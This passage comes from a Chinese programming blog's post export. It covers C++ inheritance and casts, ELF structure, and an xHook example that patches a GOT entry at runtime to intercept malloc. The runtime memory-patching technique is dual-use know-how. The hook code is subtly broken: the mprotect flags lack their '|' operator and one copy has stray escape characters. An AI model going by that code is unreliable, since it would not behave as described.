<p>第二个我们需要讨论的问题是public继承， 我们说： public继承就必然意味着 is-a关系， 这样的关系意味着， 在继承树上的移动有一定的必然性： 比如 一个函数接收base对象， 那么这个函数就必须也能保持一致性的同时正确接受derived对象， 因为derived虽然和base有一定的不同之处， 但是所有base含有的性质， 他都应当满足， 因此 反过来说， 需要一个derived对象的函数， 不一定能够成功接受base对象， 因为这个函数可能是进行derived特有的操作，也可能是进行base对象共有的操作， 也就是说， 向上移动的类型变换是安全的</p>
<p>这里额外插一嘴， 继承树的样子和我们平常数据结构的树不太一样， 唯一区别就是指针方向， 数据结构里面的树， 指针方向是从根节点到叶子节点， 继承树则是从叶子节点一层层往上， 指向根节点也就是基类</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202304071532976.png" alt="image-20230320155558413" style="zoom:50%;" /></p>
<p>如果有这样的继承关系 A&lt;-B&lt;-C 现在有一个B指针 指向C类型的实体, 那么无论把这个指针转换成A类型, 是可以用static_cast的, 这是安全的</p>
<p>这里的B是静态类型, 也就是声明类型, C是动态类型, 但是这里要变成多态还需要一个前提, 那就是虚函数, 虚函数相当于接口, 一个没有实现的接口(有实现的接口我们已经讨论过了, 那是一个不良实现)</p>
<p>查看以下例子 请手动添加virtual 作为例二</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">     <span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;<span class="comment">//手动添加virtual 作为例二, 下同</span></span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;A&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B1</span>: <span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">     <span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;B1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B2</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">     <span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;B2&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> : <span class="keyword">public</span> B1,<span class="keyword">public</span> B2 &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">     <span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;C&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    B1* b1ptr = <span class="keyword">new</span> <span class="built_in">C</span>(); <span class="comment">//b1ptr预期接受一个B1(base)对象, 所以它应当也接受C对象(derived)</span></span><br><span class="line">    <span class="comment">//C* cptr = new B1();//cptr预期接受一个C(derived)对象, 所以它不应当也接受B对象(base) 编译错误</span></span><br><span class="line">    b1ptr-&gt;<span class="built_in">foo</span>();</span><br><span class="line">    A* aptr = <span class="built_in">static_cast</span>&lt;A*&gt;(b1ptr);<span class="comment">//例二中修改为dynamic_cast</span></span><br><span class="line">    aptr-&gt;<span class="built_in">foo</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在没有virtual的时候 程序输出与静态类型 也就是声明类型唯一相关</p>
<p>这叫做<strong>早绑定</strong>, 使用的函数在编译时就已经确定了, 程序输出如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">B1</span><br><span class="line">A</span><br></pre></td></tr></table></figure>
<p>如果使用例二, 输出为</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">C</span><br><span class="line">C</span><br></pre></td></tr></table></figure>
<p>也就是说, 输出结果与静态类型毫无关系, 只与实际类型有关最开头的部分, 我们实例化了C类型的对象, 我们在后面调用的函数就会去C的虚表中查找, 这种查找发生在运行是, 也叫做<strong>动态绑定</strong></p>
<p>接下来就讲到了最重要的地方了, 各种类型转换</p>
<p>与其讲解各种类型转换的表现形式, 我更想要根据上面所讲的内容, 来告诉读者各种类型转换使用时的内在逻辑</p>
<p>继承树类似下图:</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303201727745.png" alt="image-20230320172711723" style="zoom:80%;" /></p>
<p>我主要想说明的是, 问题的关键是最下面的derived class到最上面的base class之间有多条路径的情况</p>
<p>我们可以想象这样一种情形</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303201729237.png" alt="" /><figcaption>image-20230320172936207</figcaption>
</figure>
<p>在B1和C中间有一种类型,暂时称之为X, 我们这里已经生成了一个动态类型为C的对象, 根据前文所说, 接受base实体的函数foo应当接受derived实体</p>
<p>但是实际情况呢?</p>
<p>实际上我们直接把这个静态类型为B1的指针丢给上述函数是不安全的, 因为我们虽然已经知道了他的动态类型为C, 但是有一种可能, 这个B1指针实际上指向的类型也可以是Y, Y类型是B1和X之间的一个类型, 也就是说, Y是B1的继承类, 而且是X的基类, foo函数接受X和他的继承类, 但是不应当接受X的基类, 因为X的基类可能完成不了X的工作</p>
<p>因此我们就需要对指针B1进行转换, 将它转换为类型X(或者是X的继承类) 然后再把"新的"这个指针交给foo函数</p>
<p>这里其实有很多知识点, 第一点是这个所谓的 "新的" 实际上这个指针的值没有改变, 指向的对象内容也没有改变, 他只是变换了自己的静态类型 和解释方式, 也就是说, 原本的指针被允许解释为B1类型, 或者是B1的继承类, 但是需求的指针是B1的继承类X和X的继承类, 也就是说这个区间是不太相同的, 即使实际指向的实体确实是C, 我们也需要把静态类型改变一下, 这样才符合C语言的内在规则</p>
<p>第二点是, 为什么非要用dynamic_cast来转换, 在 讲述这点之前我们先来看看这样的情况</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303201747935.png" alt="" /><figcaption>image-20230320174707905</figcaption>
</figure>
<p>如果B1伸出了两个继承分支如图所示, 那么我们不能善意的假定B1目前指向的类型一定是X方向, 也就是图中右分支方向上的一个类型, 因为B1指向左分支也是合理的, 但是左分支上的任何一个类都与右分支毫无关联, 二者不能画上约等号, 也就是说, 向下的侧向类型转换是不合法的</p>
<p>另外多说一嘴 我们平常说的sidecast是指向上的侧向类型转换</p>
<p>还是用上图, 如果一个指针B2指向C 转换成B1指针, 则合法, 因为这是上面的侧向转换(而且还得有继承关系,如果没有继承关系也是不能转换的)</p>
<p>智力游戏做到这里可能有读者发现了, 静态类型, 动态类型, 以及二者的相对关系都是我们需要考虑的点</p>
<p>好, 我们回到正题,</p>
<p>实际上并不是非要用dynamic_cast转换的, 如果你想要用static_cast 转换也是可以的, 但是需要在程序的 主体逻辑上做出改变, 比如, 已知 X类型一定是B1类型和B1指针当前实际指向对象类型中间的类型, <strong>也就是说fakeC类型剪枝了</strong> 我们也不需要dynamic_cast检查了</p>
<p>通俗版本讲完之后, 我们直接来看实际版本, 用严谨语言再描述一边, 这里只涉及最主要用法, 也就是downcast和sidecast, 不考虑upcast和void指针等情况</p>
<p>对于<code>dynamic_cast&lt; new-type &gt;( expression )</code> 找到expression 指向的对象的实际类型 (这个是通过编译器实现的查找)</p>
<p>找到这个实际类型 之后, 称之为object, 检查: <em>expression</em> 是 object的公开基类(public 继承的基类) 则说明B1, X, C处于继承树上的同一侧分支(说明C不是fakeC)</p>
<p>然后检查是否是sidecast(后面会说) , 如果不是</p>
<p>那就直接变成newtype, donwcast成功</p>
<p>sidecast 检查: expression 是object的公开基类, 同时new-type也是object的另一条分支上的公开基类 那么就sidecast 直接变成newtype, sidecast 成功</p>
<p>给出对照翻译原文如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">If expression is a pointer or reference to a polymorphic type Base(如果expression指针的静态类型是多态基类), and new-type is a pointer or reference to the type Derived(new-type是上述基类到动态类型继承路线上的可能继承类) a runtime check is performed(则检查这一可能性是否为真):</span><br><span class="line">a) The most derived object pointed/identified by expression is examined(寻找到expression所指向对象的动态类型). If, in that object(如果对于该动态类型实体), expression points/refers to a public base of Derived(expression指针指向new-type的公开基类), and if only one object of Derived type is derived from the subobject(指针之下的对象) pointed/identified by expression(被expression指针所指的那个对象, 如果是经由唯一的继承路线,继承自new-type), then the result of the cast points/refers to that Derived object(则转换成功). (This is known as a &quot;downcast&quot;.)</span><br><span class="line">b) Otherwise(否则), if expression points/refers to a public base of the most derived object( 如果有另一条路线), and, simultaneously, the most derived object has an unambiguous public base class of type Derived( new-type也是指针之下的那个实体(subobject)的公开基类), the result of the cast points/refers to that Derived (则也可以转换成功)(This is known as a &quot;sidecast&quot;.)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其中, 向上转换有一个坑点, 这里不展开, 感兴趣的请查阅https://stackoverflow.com/questions/52550064/why-is-dynamic-cast-to-a-non-unique-base-class-type-allowed/52552990#52552990</p>
<p>最后一个知识点我们需要探讨的是, 继承而来非虚函数的重写相关问题</p>
<p>我们永远不应该重写继承而来的非虚函数, 如果确实需要重写, 则将他在基类定义为虚函数</p>
<p>因为非虚函数提供了一种暗含意义, 他暗示这个函数是一种类的不变性, 基类以及继承类对此都不会有特化行为</p>
<p>也就是说所有特化行为都应该被定义为虚函数</p>
]]></content>
      <categories>
        <category>C++简明进阶教程</category>
      </categories>
      <tags>
        <tag>C++简明进阶教程</tag>
      </tags>
  </entry>
  <entry>
    <title>爱奇艺Hook库的一小段源码分析</title>
    <url>/ai-qi-yi-hook-ku-de-yi-xiao-duan-yuan-ma-fen-xi/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>例子实在是太好了，必须分析一波</p>
<h2 id="例题源码">例题源码</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;inttypes.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;test.h&gt;</span><br><span class="line"></span><br><span class="line">#define PAGE_START(addr) ((addr) &amp; PAGE_MASK)</span><br><span class="line">#define PAGE_END(addr)   (PAGE_START(addr) + PAGE_SIZE)</span><br><span class="line"></span><br><span class="line">void *my_malloc(size_t size)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%zu bytes memory are allocated by libtest.so\n&quot;, size);</span><br><span class="line">    return malloc(size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void hook()</span><br><span class="line">&#123;</span><br><span class="line">    char       line[512];</span><br><span class="line">    FILE      *fp;</span><br><span class="line">    uintptr_t  base_addr = 0;</span><br><span class="line">    uintptr_t  addr;</span><br><span class="line"></span><br><span class="line">    //find base address of libtest.so</span><br><span class="line">    if(NULL == (fp = fopen(&quot;/proc/self/maps&quot;, &quot;r&quot;))) return;</span><br><span class="line">    while(fgets(line, sizeof(line), fp))</span><br><span class="line">    &#123;</span><br><span class="line">        if(NULL != strstr(line, &quot;libtest.so&quot;) &amp;&amp;</span><br><span class="line">           sscanf(line, &quot;%&quot;PRIxPTR&quot;-%*lx %*4s 00000000&quot;, &amp;base_addr) == 1)</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    if(0 == base_addr) return;</span><br><span class="line"></span><br><span class="line">    //the absolute address</span><br><span class="line">    addr = base_addr + 0x3f90;</span><br><span class="line">    </span><br><span class="line">    //add write permission</span><br><span class="line">    mprotect((void *)PAGE_START(addr), PAGE_SIZE, PROT_READ  PROT_WRITE);</span><br><span class="line"></span><br><span class="line">    //replace the function address</span><br><span class="line">    *(void **)addr = my_malloc;</span><br><span class="line"></span><br><span class="line">    //clear instruction cache</span><br><span class="line">    __builtin___clear_cache((void *)PAGE_START(addr), (void *)PAGE_END(addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    hook();</span><br><span class="line">    </span><br><span class="line">    say_hello();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要看第十一行和第四十二行</p>
<h2 id="正文">正文</h2>
<p>第十一行是一个返回值为空指针的函数，这里目前还不太知道为什么，因为如果改成void是不影响后面操作的，姑且先认为是原作者的编写习惯</p>
<p>第四十二行 是一个改变指针解读的操作，很精妙，也很基础</p>
<p>主题逻辑是：</p>
<ol type="1">
<li>读入函数头表并定位基址</li>
<li>改变页权限</li>
<li>改写函数地址指向</li>
<li>清除指令地址缓存__builtin___clear_cache，迫使CPU重新定位</li>
<li>返回</li>
</ol>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
        <category>开发</category>
        <category>Windows</category>
      </categories>
  </entry>
  <entry>
    <title>由引用传参与指针传参调试引出的关于lea,add,inc在流水线,分支预测上的优越性比较</title>
    <url>/you-yin-yong-chuan-can-yu-zhi-zhen-chuan-can-diao-shi-yin-chu-de-guan-yu-leaaddinc-zai-liu-shui-xian/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>昨天才发现按引用传参是C++的功能,C语言没有按引用,略微有点在意,顺便调试一下,发现了一些感觉值得记录的,有一点疑问的地方</p>
<h2 id="正文">正文</h2>
<p>先声明一下,我之前并没有过一步步调试引用传参的经历,在我之前的淳朴想法当中,按指针传参和引用传参是一样的,对那个地址的内容解引用就可以了</p>
<p>不过这种淳朴的想法效率其实太低了,测试源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int a = 10;</span><br><span class="line">int* p=&amp;a;</span><br><span class="line">int foo(int a)&#123;</span><br><span class="line">    a++;</span><br><span class="line">    return a;</span><br><span class="line">&#125;</span><br><span class="line">int baar(int &amp;a)&#123;</span><br><span class="line">    a++;</span><br><span class="line">    return a;</span><br><span class="line">&#125;</span><br><span class="line">int ham(int *a)&#123;</span><br><span class="line">    (*a)++;</span><br><span class="line">    return *a;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int c;</span><br><span class="line">    c = foo(a);</span><br><span class="line">    c = baar(a);</span><br><span class="line">    c = ham(&amp;a);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译指令如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -m32 -g -o refer main.cpp</span><br></pre></td></tr></table></figure>
<p>实际情况为了把数据操作尽可能留在CPU寄存器内部</p>
<p>实际操作居然是用地址操作符LEA完成的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x565561d8 &lt;baar(int&amp;)+17&gt;    mov    eax, dword ptr [ebp + 8]</span><br><span class="line">0x565561db &lt;baar(int&amp;)+20&gt;    mov    eax, dword ptr [eax]</span><br><span class="line">0x565561dd &lt;baar(int&amp;)+22&gt;    lea    edx, [eax + 1]   //这里的eax储存的内容不是地址,而是普通的数据,这里只是利用lea做加法</span><br><span class="line">0x565561e0 &lt;baar(int&amp;)+25&gt;    mov    eax, dword ptr [ebp + 8]</span><br><span class="line">0x565561e3 &lt;baar(int&amp;)+28&gt;    mov    dword ptr [eax], edx</span><br><span class="line">0x565561e5 &lt;baar(int&amp;)+30&gt;    mov    eax, dword ptr [ebp + 8]</span><br></pre></td></tr></table></figure>
<p>关于加法的优化,涉及流水线和分支预测的优化</p>
<p>文章如下</p>
<p>https://stackoverflow.com/questions/12163610/why-inc-and-add-1-have-different-performances</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>笔记</category>
        <category>存档</category>
        <category>开发</category>
        <category>二进制</category>
        <category>C++</category>
      </categories>
      <tags>
        <tag>cpp</tag>
      </tags>
  </entry>
  <entry>
    <title>补一个大小端序，栈增长，迭代方向的底层数据处理笔记</title>
    <url>/bu-yi-ge-da-xiao-duan-xu-zhan-zeng-chang-die-dai-fang-xiang-de-di-ceng-shu-ju-chu/</url>
    <content><![CDATA[<p>突然发现这几个东西完全搞混了谁管辖谁</p>
<p>在任何情况下都有一个共识，那就是作为一个数组，0号元素存储在地址地位，最后一个元素存储在地址高位</p>
<p>不论地址增长方式，不论大小端，这个是共识</p>
<p>这个共识来自：迭代方向在微观和宏观上的统一</p>
<p>如果我for循环是0到30，计数器i++，那么微观上我们会用inc（也有的编译器是用ecx）</p>
<p>如果元素储存方向和栈增长方向相同：0号存储在最高位，最后一个元素存在栈顶，地址最低位</p>
<p>这样i++在底层汇编就变成dec了！完全相反</p>
<p>实际上，大小端序真正的含义是<strong>单个元素内部</strong>的字节顺序安排（数据高位和低位）与栈增长方向（地址大小关系）的关系</p>
<p>参考</p>
<p>https://jaimelightfoot.com/blog/pwnables-kr-collision-walkthrough/</p>
<p>https://zhuanlan.zhihu.com/p/21388517</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172112430.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172112295.png" /></p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>二进制</category>
      </categories>
  </entry>
  <entry>
    <title>转爱奇艺的Hook教程</title>
    <url>/zhuan-ai-qi-yi-de-hook-jiao-cheng/</url>
    <content><![CDATA[<p>原文根据BSD开源，所有权利归爱奇艺所有</p>
<p>https://github.com/iqiyi/xHook</p>
<p>编者感觉很多部分的内容写的很好，直接复制了一部分又补充了一部分，充当笔记</p>
<h2 id="原文摘选">原文摘选</h2>
<p>静态ELF使用section 组织各个部分，而SHT就是记录各个section的表，主要包括：section 的类型、在文件中的偏移量、大小、加载到内存后的虚拟内存相对地址、内存中字节的对齐方式等。</p>
<p>SHT中，与Hook相关的几个节区是</p>
<ul>
<li><code>.dynstr</code>：保存了所有的字符串常量信息。</li>
<li><code>.dynsym</code>：保存了符号（symbol）的信息（符号的类型、起始地址、大小、符号名称在 <code>.dynstr</code> 中的索引编号等）。函数也是一种符号。</li>
<li><code>.text</code>：程序代码经过编译后生成的机器指令。</li>
<li><code>.dynamic</code>：供动态链接器使用的各项信息，记录了当前 ELF 的外部依赖，以及其他各个重要 section 的起始位置等信息。</li>
<li><code>.got</code>：Global Offset Table。用于记录外部调用的入口地址。动态链接器（linker）执行重定位（relocate）操作时，这里会被填入真实的外部调用的绝对地址。</li>
<li><code>.plt</code>：Procedure Linkage Table。外部调用的跳板，主要用于支持 lazy binding 方式的外部调用重定位。（Android 目前只有 MIPS 架构支持 lazy binding）</li>
<li><code>.rel.plt</code>：对外部函数直接调用的重定位信息。</li>
<li><code>.rel.dyn</code>：除 <code>.rel.plt</code> 以外的重定位信息。（比如通过全局函数指针来调用外部函数）</li>
</ul>
<p><img src="https://raw.githubusercontent.com/iqiyi/xHook/master/docs/overview/res/elfpltgot.png" /></p>
<p>在ELF加载到内存时，各个部分使用segment 组织，一个 segment 包含了单/复数个 section。ELF 使用 PHT 来记录所有 segment 的基本信息。主要包括：segment 的类型、在文件中的偏移量、大小、加载到内存后的虚拟内存相对地址、内存中字节的对齐方式等。</p>
<p>所有类型为 <code>PT_LOAD</code> 的 segment 都会被动态链接器（linker）映射（mmap）到内存中。</p>
<p>例：libtest.so 的 PHT：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">caikelun@debian:~$ arm-linux-androideabi-readelf -l ./libtest.so </span><br><span class="line"></span><br><span class="line">Elf file type is DYN (Shared object file)</span><br><span class="line">Entry point 0x0</span><br><span class="line">There are 8 program headers, starting at offset 52</span><br><span class="line"></span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</span><br><span class="line">  PHDR           0x000034 0x00000034 0x00000034 0x00100 0x00100 R   0x4</span><br><span class="line">  LOAD           0x000000 0x00000000 0x00000000 0x02604 0x02604 R E 0x1000</span><br><span class="line">  LOAD           0x002e3c 0x00003e3c 0x00003e3c 0x001c8 0x001c8 RW  0x1000</span><br><span class="line">  DYNAMIC        0x002e48 0x00003e48 0x00003e48 0x00118 0x00118 RW  0x4</span><br><span class="line">  NOTE           0x000134 0x00000134 0x00000134 0x000bc 0x000bc R   0x4</span><br><span class="line">  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10</span><br><span class="line">  EXIDX          0x002504 0x00002504 0x00002504 0x00100 0x00100 R   0x4</span><br><span class="line">  GNU_RELRO      0x002e3c 0x00003e3c 0x00003e3c 0x001c4 0x001c4 RW  0x4</span><br><span class="line"></span><br><span class="line"> Section to Segment mapping:</span><br><span class="line">  Segment Sections...</span><br><span class="line">   00     </span><br><span class="line">   01     .note.android.ident .note.gnu.build-id .dynsym .dynstr .hash .gnu.version .gnu.version_d .gnu.version_r .rel.dyn .rel.plt .plt .text .ARM.extab .ARM.exidx </span><br><span class="line">   02     .fini_array .init_array .dynamic .got .data </span><br><span class="line">   03     .dynamic </span><br><span class="line">   04     .note.android.ident .note.gnu.build-id </span><br><span class="line">   05     </span><br><span class="line">   06     .ARM.exidx </span><br><span class="line">   07     .fini_array .init_array .dynamic .got</span><br></pre></td></tr></table></figure>
<h2 id="连接视图linking-view和执行视图execution-view">连接视图（Linking View）和执行视图（Execution View）</h2>
<ul>
<li>连接视图：ELF 未被加载到内存执行前，以 section 为单位的数据组织形式。</li>
<li>执行视图：ELF 被加载到内存后，以 segment 为单位的数据组织形式。</li>
</ul>
<p>我们关心的 hook 操作，属于动态形式的内存操作，因此主要关心的是执行视图，即 ELF 被加载到内存后，ELF 中的数据是如何组织和存放的。</p>
<p><img src="https://raw.githubusercontent.com/iqiyi/xHook/master/docs/overview/res/elfview.png" /></p>
<h2 id="dynamic-section">.dynamic section</h2>
<p>这是一个十分重要和特殊的 section，其中包含了 ELF 中其他各个 section 的内存位置等信息。在执行视图中，总是会存在一个类型为 <code>PT_DYNAMIC</code> 的 segment，这个 segment 就包含了 .dynamic section 的内容。</p>
<p>无论是执行 hook 操作时，还是动态链接器执行动态链接时，都需要通过 <code>PT_DYNAMIC</code> segment 来找到 .dynamic section 的内存位置，再进一步读取其他各项 section 的信息。</p>
<p>libtest.so 的 .dynamic section：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">caikelun@debian:~$ arm-linux-androideabi-readelf -d ./libtest.so </span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x2e48 contains 30 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x3f7c</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   240 (bytes)</span><br><span class="line"> 0x00000017 (JMPREL)                     0xcb8</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000011 (REL)                        0xc78</span><br><span class="line"> 0x00000012 (RELSZ)                      64 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffa (RELCOUNT)                   3</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x1f0</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000005 (STRTAB)                     0x590</span><br><span class="line"> 0x0000000a (STRSZ)                      1201 (bytes)</span><br><span class="line"> 0x00000004 (HASH)                       0xa44</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so]</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libm.so]</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libstdc++.so]</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libdl.so]</span><br><span class="line"> 0x0000000e (SONAME)                     Library soname: [libtest.so]</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x3e3c</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               8 (bytes)</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x3e44</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001e (FLAGS)                      BIND_NOW</span><br><span class="line"> 0x6ffffffb (FLAGS_1)                    Flags: NOW</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0xbc8</span><br><span class="line"> 0x6ffffffc (VERDEF)                     0xc3c</span><br><span class="line"> 0x6ffffffd (VERDEFNUM)                  1</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0xc58</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure>
<h2 id="动态链接器linker"><a href="https://github.com/iqiyi/xHook/blob/master/docs/overview/android_plt_hook_overview.zh-CN.md#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%99%A8linker"></a>动态链接器（linker）</h2>
<p>动态链接（比如执行 dlopen）的大致步骤是：</p>
<ol type="1">
<li>检查已加载的 ELF 列表。（如果 libtest.so 已经加载，就不再重复加载了，仅把 libtest.so 的引用计数加一，然后直接返回。）</li>
<li>从 libtest.so 的 .dynamic section 中读取 libtest.so 的外部依赖的 ELF 列表，从此列表中剔除已加载的 ELF，最后得到本次需要加载的 ELF 完整列表（包括 libtest.so 自身）。</li>
<li>逐个加载列表中的 ELF。加载步骤：
<ul>
<li>用 <code>mmap</code> 预留一块足够大的内存，用于后续映射 ELF。（<code>MAP_PRIVATE</code> 方式）</li>
<li>读 ELF 的 PHT，用 <code>mmap</code> 把所有类型为 <code>PT_LOAD</code> 的 segment 依次映射到内存中。</li>
<li>从 .dynamic segment 中读取各信息项，主要是各个 section 的虚拟内存相对地址，然后计算并保存各个 section 的虚拟内存绝对地址。</li>
<li>执行重定位操作（relocate），这是最关键的一步。重定位信息可能存在于下面的一个或多个 secion 中：<code>.rel.plt</code>, <code>.rela.plt</code>, <code>.rel.dyn</code>, <code>.rela.dyn</code>, <code>.rel.android</code>, <code>.rela.android</code>。动态链接器需要逐个处理这些 <code>.relxxx</code> section 中的重定位诉求。根据已加载的 ELF 的信息，动态链接器查找所需符号的地址（比如 libtest.so 的符号 <code>malloc</code>），找到后，将地址值填入 <code>.relxxx</code> 中指明的<strong>目标地址</strong>中，这些“<strong>目标地址</strong>”一般存在于<code>.got</code> 或 <code>.data</code> 中。</li>
<li>ELF 的引用计数加一。</li>
</ul></li>
<li>逐个调用列表中 ELF 的构造函数（constructor），这些构造函数的地址是之前从 .dynamic segment 中读取到的（类型为 <code>DT_INIT</code> 和 <code>DT_INIT_ARRAY</code>）。各 ELF 的构造函数是按照依赖关系逐层调用的，先调用被依赖 ELF 的构造函数，最后调用 libtest.so 自己的构造函数。（ELF 也可以定义自己的析构函数（destructor），在 ELF 被 unload 的时候会被自动调用）</li>
</ol>
<h2 id="例子">例子</h2>
<p>#include &lt;inttypes.h&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;sys/mman.h&gt; #include &lt;test.h&gt;</p>
<p>#define PAGE_START(addr) ((addr) &amp; PAGE_MASK) #define PAGE_END(addr) (PAGE_START(addr) + PAGE_SIZE)</p>
<p>void *my_malloc(size_t size) { printf("%zu bytes memory are allocated by libtest.so\n", size); return malloc(size); }</p>
<p>void hook() { char line[512]; FILE *fp; uintptr_t base_addr = 0; uintptr_t addr;</p>
<pre><code>//find base address of libtest.so
if(NULL == (fp = fopen(&quot;/proc/self/maps&quot;, &quot;r&quot;))) return;
while(fgets(line, sizeof(line), fp))
&#123;
    if(NULL != strstr(line, &quot;libtest.so&quot;) &amp;&amp;
       sscanf(line, &quot;%&quot;PRIxPTR&quot;-%\*lx %\*4s 00000000&quot;, &amp;base\_addr) == 1)
        break;
&#125;
fclose(fp);
if(0 == base\_addr) return;

//the absolute address
addr = base\_addr + 0x3f90;

//add write permission
mprotect((void \*)PAGE\_START(addr), PAGE\_SIZE, PROT\_READ  PROT\_WRITE);

//replace the function address
\*(void \*\*)addr = my\_malloc;

//clear instruction cache
\_\_builtin\_\_\_clear\_cache((void \*)PAGE\_START(addr), (void \*)PAGE\_END(addr));</code></pre>
<p>}</p>
<p>int main() { hook();</p>
<pre><code>say\_hello();
return 0;</code></pre>
<p>}</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>开发</category>
        <category>二进制</category>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>过程和函数（对象）</title>
    <url>/guo-cheng-he-han-shu-dui-xiang/</url>
    <content><![CDATA[<p>笔者不是搞学术的，本文一律认为函数是纯函数的代名词</p>
<p>#define 函数 纯函数</p>
<h2 id="正文">正文</h2>
<p>函数是没有副作用的过程，而一般我们在汇编层面编写函数，大多数情况下唯一的副作用就是eax</p>
<p>所以其实应该广义的看待子例</p>
]]></content>
      <categories>
        <category>黑历史与垃圾</category>
      </categories>
  </entry>
  <entry>
    <title>pwn1_sctf_2016 WP</title>
